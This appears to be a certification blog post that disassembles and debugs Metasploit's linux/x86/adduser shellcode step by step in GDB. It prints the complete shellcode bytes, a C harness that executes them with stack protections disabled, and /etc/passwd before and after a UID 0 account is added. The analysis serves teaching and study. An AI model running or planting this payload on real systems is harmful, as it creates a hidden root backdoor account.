# SLAE #5–1: Shell-code Analysis for linux/x86/adduser
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1535

# Background and tools 
Necessary background: C — Assembly — syscalls in linux
Used tools: Msfvenom — gcc— ndisasm — GDB with peda extension

In this post I’m going to present my analysis for a shell-code generated from msfvenom. For starter, to display all shell-codes for linux-x86 run the following command:
```
dipsy@kali:~$ msfvenom -l payloads | grep linux | grep x86 
```
I’m going to analyze the following shell-code in this post.
```
linux/x86/adduser   Create a new user with UID 0
```
Kind reminder, EAX register will hold the syscall number as well as the return value of the syscall. EBX holds the first parameter, ECX second, EDX third, ESI fourth and EDI fifth.

# Generating and dissecting the shell-code

Before generating the shell-code, lets see the basic options for this payload:
```
dipsy@kali:~$ msfvenom -p linux/x86/adduser --list-options
Options for payload/linux/x86/adduser:
=========================
Name: Linux Add User
     Module: payload/linux/x86/adduser
   Platform: Linux
       Arch: x86
Needs Admin: Yes
 Total size: 97
       Rank: Normal
Provided by:
    skape <mmiller@hick.org>
    vlad902 <vlad902@gmail.com>
    spoonm <spoonm@no$email.com>
Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
PASS   metasploit       yes       The password for this user
SHELL  /bin/sh          no        The shell for this user
USER   metasploit       yes       The username to create
Description:
  Create a new user with UID 0
[...]
The current setting for this payload is metasploit for both the PASS and USER field, of-course we can customize it by our own.
The following command generates a shell-code with the value oxdipsy as a username and as a password in c formatting.
dipsy@kali:~$ msfvenom -p linux/x86/adduser USER=oxdipsy PASS=oxdipsy -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 94 bytes
Final size of c file: 421 bytes
unsigned char buf[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x25\x00\x00\x00\x6f\x78"
"\x64\x69\x70\x73\x79\x3a\x41\x7a\x32\x4d\x6e\x52\x70\x37\x6f"
"\x78\x4b\x58\x51\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69"
"\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a"
"\x01\x58\xcd\x80";
```

To dissect the shell-code we can use ndisasm, where -u means operating in 32-bit mode. Note that there are 4 syscalls, 0x46, 0x5, 0x4 and 0x1 respectively. I’m going to explain each syscall separately in the debugging part — stay tuned ★!
```
dipsy@ubuntu:~$ echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x25\x00\x00\x00\x6f\x78\x64\x69\x70\x73\x79\x3a\x41\x7a\x32\x4d\x6e\x52\x70\x37\x6f\x78\x4b\x58\x51\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E825000000        call dword 0x50
0000002B  6F                outsd
0000002C  7864              js 0x92
0000002E  697073793A417A    imul esi,[eax+0x73],dword 0x7a413a79
00000035  324D6E            xor cl,[ebp+0x6e]
00000038  52                push edx
00000039  7037              jo 0x72
0000003B  6F                outsd
0000003C  784B              js 0x89
0000003E  58                pop eax
0000003F  51                push ecx
00000040  3A30              cmp dh,[eax]
00000042  3A30              cmp dh,[eax]
00000044  3A3A              cmp bh,[edx]
00000046  2F                das
00000047  3A2F              cmp ch,[edi]
00000049  62696E            bound ebp,[ecx+0x6e]
0000004C  2F                das
0000004D  7368              jnc 0xb7
0000004F  0A598B            or bl,[ecx-0x75]
00000052  51                push ecx
00000053  FC                cld
00000054  6A04              push byte +0x4
00000056  58                pop eax
00000057  CD80              int 0x80
00000059  6A01              push byte +0x1
0000005B  58                pop eax
0000005C  CD80              int 0x80
Lets prepare our skeleton to run our shell-code.
#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x25\x00\x00\x00\x6f\x78"
"\x64\x69\x70\x73\x79\x3a\x41\x7a\x32\x4d\x6e\x52\x70\x37\x6f"
"\x78\x4b\x58\x51\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69"
"\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a"
"\x01\x58\xcd\x80";
int main(){
printf("Shellcode Length:  %d\n", strlen(shellcode));
int (*ret)() = (int(*)())shellcode;
ret();
return 0;
}
```
Compile it:
```
dipsy@ubuntu:~$ gcc adduser.c -o adduser -z execstack -fno-stack-protector
```

# Analyzing SYS-CALLS (MOV AL, 0x46)

Lets start Debugging with GDB 
Running the program, setting a break-point at call EAX, which is equivalent to ret(), and run:
```
dipsy@ubuntu:~$ sudo gdb ./adduser 
[sudo] password for dipsy:
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/dipsy/Desktop/Assignments/Analysis/adduser...(no debugging symbols found)...done.
gdb-peda$ disassemble main 
Dump of assembler code for function main:
   0x080483e4 <+0>: push   ebp
   0x080483e5 <+1>: mov    ebp,esp
   0x080483e7 <+3>: push   edi
   0x080483e8 <+4>: and    esp,0xfffffff0
   0x080483eb <+7>: sub    esp,0x30
   0x080483ee <+10>: mov    eax,0x804a040
   0x080483f3 <+15>: mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080483fb <+23>: mov    edx,eax
   0x080483fd <+25>: mov    eax,0x0
   0x08048402 <+30>: mov    ecx,DWORD PTR [esp+0x1c]
   0x08048406 <+34>: mov    edi,edx
   0x08048408 <+36>: repnz scas al,BYTE PTR es:[edi]
   0x0804840a <+38>: mov    eax,ecx
   0x0804840c <+40>: not    eax
   0x0804840e <+42>: lea    edx,[eax-0x1]
   0x08048411 <+45>: mov    eax,0x8048510
   0x08048416 <+50>: mov    DWORD PTR [esp+0x4],edx
   0x0804841a <+54>: mov    DWORD PTR [esp],eax
   0x0804841d <+57>: call   0x8048300 <printf@plt>
   0x08048422 <+62>: mov    DWORD PTR [esp+0x2c],0x804a040
   0x0804842a <+70>: mov    eax,DWORD PTR [esp+0x2c]
   0x0804842e <+74>: call   eax
   0x08048430 <+76>: mov    edi,DWORD PTR [ebp-0x4]
   0x08048433 <+79>: leave  
   0x08048434 <+80>: ret    
End of assembler dump.
gdb-peda$ break* 0x0804842e
Breakpoint 1 at 0x804842e
gdb-peda$ run 
Shellcode Length:  40
``` 
Stepping into instructions, clarifies that the shell-code starts with zeroing out ECX and EBX register, setting the syscall number in EAX which is 0x46–70 in decimal.
```
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
``` 
We can identify the syscall using the following command:
```
dipsy@ubuntu:~$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 70 
#define __NR_setreuid   70
#define __NR_setresgid  170
#define __NR_tgkill  270
``` 
According to the manual, setreuid syscall is used “to set real and effective user IDs of the calling process.”
```
dipsy@ubuntu:~$ man 70 setreuid
``` 
In Linux, Every process has three user IDs: the real user ID (RUID), the effective user ID (EUID), and the saved user ID (SUID). The idea is that a process can temporarily gain privileges, then abandon them when it doesn’t need them anymore, and gain them back when it needs them again.

The signature of the function is as follows:
```
int setreuid(uid_t ruid, uid_t euid);
``` 
EBX will hold the value of ruid and ECX will hold the value of euid. Note that both are set to zero. That is because we are going to add a new user most likely in the /etc/passwd file, which requires root privileges. So, to be able to edit a file with high privilege the process that wants edit it has to have appropriate privileges — AKA root privileges.
The return value is zero, which means that the syscall has been returned successfully with no problems.
```
[-----------------------------registers----------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x786f0000 ('')
EBP: 0xbffff728 --> 0x0 
ESP: 0xbffff6ec --> 0x8048430 (<main+76>: mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a049 --> 0x3158056a
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[--------------------------------code------------------------------]
   0x804a044 <shellcode+4>: push   0x46
   0x804a046 <shellcode+6>: pop    eax
   0x804a047 <shellcode+7>: int    0x80
=> 0x804a049 <shellcode+9>: push   0x5
   0x804a04b <shellcode+11>: pop    eax
   0x804a04c <shellcode+12>: xor    ecx,ecx
   0x804a04e <shellcode+14>: push   ecx
   0x804a04f <shellcode+15>: push   0x64777373
[-----------------------------stack--------------------------------]
0000| 0xbffff6ec --> 0x8048430 (<main+76>: mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6f0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6f4 --> 0x28 ('(')
0012| 0xbffff6f8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6fc --> 0x8048461 (<__libc_csu_init+33>: lea    eax,[ebx-0xe0])
0020| 0xbffff700 --> 0xffffffff 
0024| 0xbffff704 --> 0xb7e54196 (add    ebx,0x172e5e)
0028| 0xbffff708 --> 0xb7fc6ff4 --> 0x1a5d7c 
[------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a049 in shellcode ()
``` 
To make sure that the reuid and euid of the current process actually has been set probably, you can run the following command:
```
gdb-peda$ shell ps -o pid,euid,ruid,cmd
  PID  EUID  RUID CMD
 5463     0  1000 sudo gdb ./adduser
 5464     0     0 gdb ./adduser
 5466     0     0 /home/dipsy/Desktop/Assignments/Analysis/adduser
 5560     0     0 ps -o pid,euid,ruid,cmd
 ``` 
# Analyzing SYS-CALLS (MOV AL, 0x5)
The second syscall sets the EAX to 0x5, EBX to hex values and ECX to 0x401.
```
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
``` 
Lets clarify the meaning of the syscall and the passed parameters by running the following command.
```
dipsy@ubuntu:~$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 5 
#define __NR_open    5
``` 
So syscall 0x5 corresponds to open, we can query more information by utilizing the manual.
``` 
dipsy@ubuntu:~$ man 2 open
``` 
According to the manual; “The open() system call opens the file specified by pathname.” 

The following signatures are also provided:
``` 
int open(const char *pathname, int flags);
int open(const char *pathname, int flags, mode_t mode);
``` 
So, EBX will hold the pathname and ECX will hold the flags. Stepping into the instructions clarifies that EBX will hold the value “/etc//passwd” , extra slash does’t make any difference, added to make the length multiple of four.
```
[----------------------------------registers-----------------------]
EAX: 0x5 
EBX: 0xbffff6dc ("/etc//passwd")
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x786f0000 ('')
EBP: 0xbffff728 --> 0x0 
ESP: 0xbffff6dc ("/etc//passwd")
EIP: 0x804a060 --> 0xcd04b541
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------]
   0x804a054 <shellcode+20>: push   0x61702f2f
   0x804a059 <shellcode+25>: push   0x6374652f
   0x804a05e <shellcode+30>: mov    ebx,esp
=> 0x804a060 <shellcode+32>: inc    ecx
   0x804a061 <shellcode+33>: mov    ch,0x4
   0x804a063 <shellcode+35>: int    0x80
   0x804a065 <shellcode+37>: xchg   ebx,eax
   0x804a066 <shellcode+38>: call   0x804a090 <shellcode+80>
[------------------------------------stack-------------------------]
0000| 0xbffff6dc ("/etc//passwd")
0004| 0xbffff6e0 ("//passwd")
0008| 0xbffff6e4 ("sswd")
0012| 0xbffff6e8 --> 0x0 
0016| 0xbffff6ec --> 0x8048430 (<main+76>: mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6f0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6f4 --> 0x28 ('(')
0028| 0xbffff6f8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a060 in shellcode ()
``` 

To check which flags correspond to 0x401, we can check fcntl.h header file:
``` 
dipsy@ubuntu:~$ cat /usr/include/asm-generic/fcntl.h | grep 1 
#define O_WRONLY        00000001
[...]
dipsy@ubuntu:~$ cat /usr/include/asm-generic/fcntl.h | grep 400 
#define O_NOCTTY        00000400        /* not fcntl */
[...]
``` 
According to the manual;
O_WRONLY: Open for writing only.
O_NOCTTY: If set and path identifies a terminal device, open() shall not cause the terminal device to become the controlling terminal for the process.

The final SYSCALL is something like this:
```
open("/etc/passwd", O_WRONLY | O_NOCTTY); 
``` 
If the SYSCALL succeeds, the file descriptor should be returned in EAX.
``` 
[----------------------------------registers-----------------------]
EAX: 0x7 
EBX: 0xbffff6dc ("/etc//passwd")
ECX: 0x401 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x786f0000 ('')
EBP: 0xbffff728 --> 0x0 
ESP: 0xbffff6dc ("/etc//passwd")
EIP: 0x804a065 --> 0x25e893
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------]
   0x804a060 <shellcode+32>: inc    ecx
   0x804a061 <shellcode+33>: mov    ch,0x4
   0x804a063 <shellcode+35>: int    0x80
=> 0x804a065 <shellcode+37>: xchg   ebx,eax
   0x804a066 <shellcode+38>: call   0x804a090 <shellcode+80>
   0x804a06b <shellcode+43>: outs   dx,DWORD PTR ds:[esi]
   0x804a06c <shellcode+44>: js     0x804a0d2
   0x804a06e <shellcode+46>: imul   esi,DWORD PTR [eax+0x73],0x7a413a79
[------------------------------------stack-------------------------]
0000| 0xbffff6dc ("/etc//passwd")
0004| 0xbffff6e0 ("//passwd")
0008| 0xbffff6e4 ("sswd")
0012| 0xbffff6e8 --> 0x0 
0016| 0xbffff6ec --> 0x8048430 (<main+76>: mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6f0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6f4 --> 0x28 ('(')
0028| 0xbffff6f8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a065 in shellcode ()
``` 

# Analyzing SYS-CALLS (MOV AL, 0x4)
After setting up the appropriate privileges for the process to edit the file, and opening /etc/passwd, it is the time to finally add the user ╰(*°▽°*)╯. The following block shows the instructions to be explained in this section.
```
00000025  93                xchg eax,ebx
00000026  E825000000        call dword 0x50
0000002B  6F                outsd
0000002C  7864              js 0x92
0000002E  697073793A417A    imul esi,[eax+0x73],dword 0x7a413a79
00000035  324D6E            xor cl,[ebp+0x6e]
00000038  52                push edx
00000039  7037              jo 0x72
0000003B  6F                outsd
0000003C  784B              js 0x89
0000003E  58                pop eax
0000003F  51                push ecx
00000040  3A30              cmp dh,[eax]
00000042  3A30              cmp dh,[eax]
00000044  3A3A              cmp bh,[edx]
00000046  2F                das
00000047  3A2F              cmp ch,[edi]
00000049  62696E            bound ebp,[ecx+0x6e]
0000004C  2F                das
0000004D  7368              jnc 0xb7
0000004F  0A598B            or bl,[ecx-0x75]
00000052  51                push ecx
00000053  FC                cld
00000054  6A04              push byte +0x4
00000056  58                pop eax
00000057  CD80              int 0x80
``` 
The file descriptor from the previous call is saved in ebx, while eax now hold /etc//passwd.
``` 
[----------------------------------registers-----------------------]
EAX: 0xbffff6dc ("/etc//passwd")
EBX: 0x7 
ECX: 0x401 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x786f0000 ('')
EBP: 0xbffff728 --> 0x0 
ESP: 0xbffff6dc ("/etc//passwd")
EIP: 0x804a066 --> 0x25e8
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------]
   0x804a061 <shellcode+33>: mov    ch,0x4
   0x804a063 <shellcode+35>: int    0x80
   0x804a065 <shellcode+37>: xchg   ebx,eax
=> 0x804a066 <shellcode+38>: call   0x804a090 <shellcode+80>
   0x804a06b <shellcode+43>: outs   dx,DWORD PTR ds:[esi]
   0x804a06c <shellcode+44>: js     0x804a0d2
   0x804a06e <shellcode+46>: imul   esi,DWORD PTR [eax+0x73],0x7a413a79
   0x804a075 <shellcode+53>: xor    cl,BYTE PTR [ebp+0x6e]
Guessed arguments:
arg[0]: 0x6374652f ('/etc')
arg[1]: 0x61702f2f ('//pa')
arg[2]: 0x64777373 ('sswd')
arg[3]: 0x0 
arg[4]: 0x8048430 (<main+76>: mov    edi,DWORD PTR [ebp-0x4])
[------------------------------------stack-------------------------]
0000| 0xbffff6dc ("/etc//passwd")
0004| 0xbffff6e0 ("//passwd")
0008| 0xbffff6e4 ("sswd")
0012| 0xbffff6e8 --> 0x0 
0016| 0xbffff6ec --> 0x8048430 (<main+76>: mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6f0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6f4 --> 0x28 ('(')
0028| 0xbffff6f8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a066 in shellcode ()
``` 
I believe that the call instruction follows JMP-CALL-POP technique, that is why we see our customized username and password pushed into the stack then popped to ECX.
``` 
[----------------------------------registers-----------------------]
EAX: 0xbffff6dc ("/etc//passwd")
EBX: 0x7 
ECX: 0x401 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a069 --> 0x786f0000 ('')
EBP: 0xbffff728 --> 0x0 
ESP: 0xbffff6d8 --> 0x804a06b ("oxdipsy:Az2MnRp7oxKXQ:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀")
EIP: 0x804a090 --> 0xfc518b59
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------]
=> 0x804a090 <shellcode+80>: pop    ecx
   0x804a091 <shellcode+81>: mov    edx,DWORD PTR [ecx-0x4]
   0x804a094 <shellcode+84>: push   0x4
   0x804a096 <shellcode+86>: pop    eax
[------------------------------------stack-------------------------]
0000| 0xbffff6d8 --> 0x804a06b ("oxdipsy:Az2MnRp7oxKXQ:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀")
0004| 0xbffff6dc ("/etc//passwd")
0008| 0xbffff6e0 ("//passwd")
0012| 0xbffff6e4 ("sswd")
0016| 0xbffff6e8 --> 0x0 
0020| 0xbffff6ec --> 0x8048430 (<main+76>: mov    edi,DWORD PTR [ebp-0x4])
0024| 0xbffff6f0 --> 0x8048510 ("Shellcode Length:  %d\n")
0028| 0xbffff6f4 --> 0x28 ('(')
[------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a090 in shellcode ()
``` 
The mov instruction, moves a value from the ecx to the edx.
```
mov    edx,DWORD PTR [ecx-0x4]
``` 
Stepping into the instruction, shows that the value is 0x25–37 in decimal.
```
[----------------------------------registers-----------------------]
EAX: 0xbffff6dc ("/etc//passwd")
EBX: 0x7 
ECX: 0x804a06b ("oxdipsy:Az2MnRp7oxKXQ:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀")
EDX: 0x25 ('%')
ESI: 0x0 
EDI: 0x804a069 --> 0x786f0000 ('')
EBP: 0xbffff728 --> 0x0 
ESP: 0xbffff6dc ("/etc//passwd")
EIP: 0x804a094 --> 0xcd58046a
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------]
   0x804a08f <shellcode+79>: or     bl,BYTE PTR [ecx-0x75]
   0x804a092 <shellcode+82>: push   ecx
   0x804a093 <shellcode+83>: cld    
=> 0x804a094 <shellcode+84>: push   0x4
   0x804a096 <shellcode+86>: pop    eax
   0x804a097 <shellcode+87>: int    0x80
   0x804a099 <shellcode+89>: push   0x1
   0x804a09b <shellcode+91>: pop    eax
[------------------------------------stack-------------------------]
0000| 0xbffff6dc ("/etc//passwd")
0004| 0xbffff6e0 ("//passwd")
0008| 0xbffff6e4 ("sswd")
0012| 0xbffff6e8 --> 0x0 
0016| 0xbffff6ec --> 0x8048430 (<main+76>: mov    edi,DWORD PTR [ebp-0x4])
0020| 0xbffff6f0 --> 0x8048510 ("Shellcode Length:  %d\n")
0024| 0xbffff6f4 --> 0x28 ('(')
0028| 0xbffff6f8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
[------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a094 in shellcode ()
``` 
After that, EAX is set with 4 which corresponds to SYSCALL write.
```
dipsy@ubuntu:~$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 4
#define __NR_write    4
``` 
According to the manual, the signature of the function is as follows:
```
ssize_t write(int fd, const void *buf, size_t count);
```
Which means that by now, EBX should hold the value of the file descriptor, ECX should have the buffer value, AKA the value to write, and EDX should hold the number of bytes to be written from the buffer to the file, AKA 37 bytes.
On success the number of bytes written should be returned in EAX, which is exactly the number of bytes specified earlier.
```
[----------------------------------registers-----------------------]
EAX: 0x25 ('%')
[...]
``` 
# Analyzing SYS-CALLS (MOV AL, 0x1)
The last SYSCALL is the exit SYSCALL which simply exits the program
```
00000059  6A01              push byte +0x1
0000005B  58                pop eax
0000005C  CD80              int 0x80
``` 
# Effect on /etc/passwd
Before running the shell-code, /etc/passwd contains the following users.
```
dipsy@ubuntu:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:105:114::/nonexistent:/bin/false
avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
saned:x:114:123::/home/saned:/bin/false
dipsy:x:1000:1000:dipsy,,,:/home/dipsy:/bin/bash
``` 
After running the shell-code, the user has been added successfully (❁´◡`❁)
```
dipsy@ubuntu:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:105:114::/nonexistent:/bin/false
avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
saned:x:114:123::/home/saned:/bin/false
dipsy:x:1000:1000:dipsy,,,:/home/dipsy:/bin/bash
oxdipsy:Az2MnRp7oxKXQ:0:0::/:/bin/sh
``` 
And we can switch to that user successfully:
```
dipsy@ubuntu:~$ su - oxdipsy 
Password: 
# whoami
root
``` 


Your questions, comments are valuable and highly appreciated.
Thank you for bearing to the end!
XOR EAX, EAX 
MOV al, 0x1 
int 0x80 
